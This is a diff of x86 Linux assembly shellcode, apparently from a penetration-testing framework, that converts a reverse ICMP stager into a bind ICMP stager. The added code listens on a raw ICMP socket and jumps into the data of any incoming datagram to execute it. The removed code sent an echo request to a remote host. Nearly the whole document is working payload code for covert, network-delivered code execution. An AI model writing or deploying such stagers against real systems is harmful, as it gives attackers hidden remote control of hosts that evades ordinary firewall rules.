@@ -1,7 +1,6 @@
 ;;
 ; 
-;        Name: stager_sock_reverse_icmp
-;   Qualities: Can Have Nulls
+;        Name: stager_sock_bind_icmp
 ;   Platforms: Linux
 ;     Authors: skape <mmiller [at] hick.org>
 ;     Version: $Revision$
@@ -13,9 +12,11 @@
 ;
 ; Description:
 ;
-;        Implementation of a Linux reverse ICMP stager.  This
-;        payload sends an ICMP echo request to a remote host
-;        and then waits for a response.
+;        Implementation of a Linux bind ICMP stager.  This means it
+;        listens for ICMP echo requests and attempts to execute their
+;        payload.  Right now it's kind of risky because any ICMP
+;        datagram that it sees will cause it to try to execute its 
+;        payload.  This could be improved with a tag based system.
 ;
 ;;
 BITS   32
@@ -36,36 +37,11 @@ socket:
 	int  0x80
 	xchg eax, ebx
 
-sendto:
-	pop  ecx
-	push dword 0x0100007f ; RHOST
-	push ecx
-	mov  ecx, esp
-	push edx
-	push edx
-	mov  dl, 0x8
-	push word 0xfff7
-	push word dx
-	mov  edi, esp
-	push byte 0x10
-	push ecx
-	cdq
-	push edx
-	push byte 0x9
-	push edi
-	push ebx
-	mov  ecx, esp
-	push byte 0xb
-	pop  ebx
-	mov  al, 0x66
-	int  0x80
-
 read:
-	pop  ebx
 	mov  al, 0x3
 	mov  dh, 0xc
 	int  0x80
-	push byte 0x18
+	push byte 0x1c
 	pop  edx
 	add  ecx, edx
 	jmp  ecx
